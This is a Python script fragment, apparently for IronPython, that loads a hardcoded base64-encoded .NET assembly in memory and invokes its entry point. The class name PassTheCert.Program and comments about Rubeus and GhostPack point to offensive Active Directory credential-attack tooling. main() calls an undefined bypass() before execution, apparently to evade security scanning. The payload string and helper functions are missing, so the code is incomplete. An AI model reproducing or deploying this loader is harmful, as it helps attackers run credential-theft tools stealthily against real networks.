def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("PassTheCert.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()